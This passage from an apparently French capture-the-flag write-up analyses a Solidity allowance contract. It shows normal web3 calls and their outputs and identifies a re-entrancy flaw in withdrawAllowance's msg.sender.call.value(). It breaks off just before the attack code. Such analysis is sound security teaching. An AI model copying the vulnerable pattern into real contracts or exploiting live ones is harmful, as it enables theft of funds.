    &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;sorceryAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;withdrawAllowance()&lt;/code&gt; utilise le modifier &lt;code class=&quot;highlighter-rouge&quot;&gt;isEligible()&lt;/code&gt; précédent. Cette fonction permet de demander une &lt;code class=&quot;highlighter-rouge&quot;&gt;allowancePerYear&lt;/code&gt; au smart contract. On ne peut appeler cette fonction, qu’une seule fois par an car c’est le modifieur qui choisis de mettre à jour &lt;code class=&quot;highlighter-rouge&quot;&gt;alreadyWithdrawn&lt;/code&gt;à &lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt;ou non.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;donateToSorcery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sorceryDestination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;sorceryAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sorceryDestination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;queryCreditOfSorcery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sorcerySource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sorceryAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sorcerySource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ces 2 dernières fonctions permettent de faire un don à une adresse précise et de connaître le solde d’ether d’une adresse précise.&lt;/p&gt;

&lt;p&gt;Pour commencer, nous allons utiliser le smart contract d’une manière normale.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;constant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ABI&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0x8B1A677d85cd44afd3878E9201e7eff27e397421&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// adresse d'instance&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On crée notre “connexion” au smart contract.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startStudyDate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1577111586&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Mon Dec 23 2019 15:33:06&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On récupère les valeurs de toutes les variables. On comprend alors qu’une quantité de &lt;code class=&quot;highlighter-rouge&quot;&gt;100&lt;/code&gt;est disponible, et que cette dernière est distribuée par morceaux de &lt;code class=&quot;highlighter-rouge&quot;&gt;10&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Essayons alors de récupérer une part:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// solde&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// récupérons une part&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withdrawAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// solde&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le solde a bien diminué, il est passé de &lt;code class=&quot;highlighter-rouge&quot;&gt;100&lt;/code&gt; à &lt;code class=&quot;highlighter-rouge&quot;&gt;90&lt;/code&gt;, on a retiré une part.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le nombre de retraits a été incrémenté, et &lt;code class=&quot;highlighter-rouge&quot;&gt;alreadyWithdrawn&lt;/code&gt;est passé à &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;La seule manière de redemander une part est de remettre &lt;code class=&quot;highlighter-rouge&quot;&gt;alreadyWithdrawn&lt;/code&gt; à &lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Pour cela, il faut respecter la condition suivante:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;startStudyDate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;days&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Il faut donc patienter un an…&lt;/p&gt;

&lt;h2 id=&quot;attack-2&quot;&gt;Attack&lt;/h2&gt;

&lt;p&gt;La seule fonction que nous pouvons attaquer est &lt;code class=&quot;highlighter-rouge&quot;&gt;withdrawAllowance()&lt;/code&gt;. Les fonctions &lt;code class=&quot;highlighter-rouge&quot;&gt;donateToSorcery()&lt;/code&gt;et &lt;code class=&quot;highlighter-rouge&quot;&gt;queryCreditOfSorcery()&lt;/code&gt;ne faisant pas grand chose d’intéressant.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;withdrawAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;isEligible&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()){&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;sorceryAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On ne peut pas attaquer le &lt;code class=&quot;highlighter-rouge&quot;&gt;require()&lt;/code&gt;, la condition &lt;code class=&quot;highlighter-rouge&quot;&gt;availableAllowance &amp;gt;= allowancePerYear&lt;/code&gt;, n’est pas un problème. On peut commencer à chercher sur &lt;code class=&quot;highlighter-rouge&quot;&gt;msg.sender.call.value(allowancePerYear)()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;En cherchant sur Google: &lt;code class=&quot;highlighter-rouge&quot;&gt;msg.sender.call.value&lt;/code&gt;. On tombe sur la vulnérabilité Re-Entrancy.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;https://solidity.readthedocs.io/en/v0.6.0/security-considerations.html#re-entrancy&quot;&gt;Security Considerations - Re-Entrancy&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;https://hackernoon.com/smart-contract-security-part-1-reentrancy-attacks-ddb3b2429302&quot;&gt;Re-entrancy Attacks&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;https://consensys.github.io/smart-contract-best-practices/known_attacks/&quot;&gt;Known Attacks&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4&quot;&gt;Example Of An Attack Contract&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;Voici le code de l’attaque:&lt;/p&gt;

&lt;blockquote&gt;
